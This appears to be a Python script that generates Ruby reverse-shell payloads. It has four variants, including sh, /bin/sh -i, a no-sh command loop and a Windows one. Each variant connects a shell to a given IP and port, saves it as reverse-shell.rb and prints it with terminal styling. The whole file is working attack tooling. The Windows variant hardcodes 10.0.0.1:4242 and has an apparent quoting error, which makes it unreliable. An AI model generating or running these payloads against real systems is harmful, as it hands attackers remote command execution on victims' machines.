from rich.console import Console
from rich.syntax import Syntax
from rich.style import Style
import time

console = Console()

def Ruby_1(ip, port):
    payload = f"ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{ip}\",{port}))'"
    with open("reverse-shell.rb", "w") as f, console.status("[#aed06d]Loading Reverse Shell...[/#aed06d]", spinner="pong"):
        time.sleep(3)
        f.write(payload)
    myStyle = Style(color="#7780ff", bold=True)
    console.print("The payload is: \n", style=myStyle)
    synt = Syntax(payload,"ruby",theme='dracula', line_numbers=True)
    console.print(synt)
    console.print("\n[#aed06d]Saved as reverse-shell.rb\n[/#aed06d]", style=myStyle)

def Ruby_2(ip, port):
    payload = f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
    with open("reverse-shell.rb", "w") as f, console.status("[#aed06d]Loading Reverse Shell...[/#aed06d]", spinner="pong"):
        time.sleep(3)
        f.write(payload)
    myStyle = Style(color="#7780ff", bold=True)
    console.print("The payload is: \n", style=myStyle)
    synt = Syntax(payload,"ruby",theme='dracula', line_numbers=True)
    console.print(synt)
    console.print("\n[#aed06d]Saved as reverse-shell.rb\n[/#aed06d]", style=myStyle)

def Ruby_no_sh(ip, port):
    payload = """ruby -rsocket -e'exit if fork;c=TCPSocket.new("%s","%d");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'""" % (ip, port)
    with open("reverse-shell.rb", "w") as f, console.status("[#aed06d]Loading Reverse Shell...[/#aed06d]", spinner="arc"):
        time.sleep(3)
        f.write(payload)
    myStyle = Style(color="#7780ff", bold=True)
    console.print("The payload is: \n", style=myStyle)
    synt = Syntax(payload,"ruby",theme='dracula', line_numbers=True)
    console.print(synt)
    console.print("\n[#aed06d]Saved as reverse-shell.rb\n[/#aed06d]", style=myStyle)

def Ruby_Windows_Only(ip, port):
    payload = f"ruby -rsocket -e 'c=TCPSocket.new(\"10.0.0.1\",\"4242\");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'"
    with open("reverse-shell.rb", "w") as f, console.status("[#aed06d]Loading Reverse Shell...[/#aed06d]", spinner="arrow3"):
        time.sleep(3)
        f.write(payload)
    myStyle = Style(color="#7780ff", bold=True)
    console.print("The payload is: \n", style=myStyle)
    synt = Syntax(payload,"ruby",theme='dracula', line_numbers=True)
    console.print(synt)
    console.print("\n[#aed06d]Saved as reverse-shell.rb\n[/#aed06d]", style=myStyle)